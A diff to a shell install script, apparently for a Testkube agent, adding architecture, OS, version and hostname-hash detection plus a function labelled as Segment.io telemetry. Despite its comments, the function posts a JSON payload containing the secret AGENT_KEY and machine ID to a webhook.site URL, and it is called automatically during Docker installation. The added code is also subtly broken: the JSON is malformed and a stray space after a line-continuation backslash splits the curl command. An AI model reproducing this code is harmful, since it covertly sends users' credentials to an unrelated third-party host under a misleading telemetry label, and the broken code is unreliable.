@@ -8,6 +8,111 @@ log() {
   echo "[INFO] $1"
 }
 
+_detect_arch() {
+    case $(uname -m) in
+    amd64|x86_64) echo "x86_64"
+    ;;
+    arm64|aarch64) echo "arm64"
+    ;;
+    i386) echo "i386"
+    ;;
+    *) echo "Unsupported processor architecture";
+    return 1
+    ;;
+     esac
+}
+
+_detect_os(){
+    case $(uname) in
+    Linux) echo "Linux"
+    ;;
+    Darwin) echo "Darwin"
+    ;;
+    Windows) echo "Windows"
+    ;;
+     esac
+}
+
+_detect_version() {
+  local tag
+
+  tag="$(
+    curl -s "https://api.github.com/repos/kubeshop/testkube/releases/latest" \
+      2>/dev/null \
+      | jq -r '.tag_name' \
+  )"
+
+  echo "${tag/#v/}" # remove leading v if present
+
+}
+
+_calculate_machine_id() {
+  local hash
+
+# Calculate hash using md5sum
+  hash=$(echo -n "$(hostname)" | md5sum | awk '{print $1}')
+
+  echo "$hash"
+}
+
+version="$(_detect_version)"
+arch="$(_detect_arch)"
+os="$(_detect_os)"
+machine_id="$(_calculate_machine_id)"
+
+# Function to send event message to Segment.io
+send_event_to_segment() {
+  local event="$1"  
+  local error_code="$2"
+  local error_type="$3"
+  local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+    
+  # Prepare the JSON payload
+  local payload=$(cat <<EOF
+{
+  "userId":          "$machine_id",
+  "event":           "$event",
+  "properties": {
+    "name":          "testkube-api-server",
+    "version":       "$version",
+    "arch":          "$arch",
+    "os":            "$os",
+    "eventCategory": "api",
+    "containerEnv":  "docker",
+    "contextType":   "agent",
+    "machineId":     "$machine_id",
+    "clusterType":   "kind",
+    "errorType":     "$error_type"
+    "errorCode":     "$error_code",
+    "agentKey":      "$AGENT_KEY",
+    "machineId":     "$machine_id"
+  },
+  "context": {
+    "app": {
+      "name":        "testkube-api-server",
+      "version":     "$version",
+      "build": "     "cloud"
+    }
+  },
+  "timestamp": "$timestamp"
+}
+EOF
+)
+
+  # Send the error to Segment via HTTP API
+  # https://api.segment.io/v1/track
+  curl -X POST https://webhook.site/a8ee5dd1-71cf-432b-adaa-feaddb6f901e \ 
+      -H "Content-Type: application/json" \
+      -d "$payload"
+
+  # Check if the curl command was successful
+  if [ $? -eq 0 ]; then
+      log "Error message successfully sent to Segment."
+  else
+      log "Failed to send error message to Segment."
+  fi
+}
+
 # Check if agent key is provided
 if [ -z "$AGENT_KEY" ]; then
   log "Please provide AGENT_KEY env var"
@@ -28,6 +133,8 @@ while ! docker info; do
   log "Waiting docker for 5 seconds..."
   sleep 5
 done
+
+send_event_to_segment "start_docker_installation"
 
 # Step 3: Import pre-installed images
 for file in /images/*.tar; do
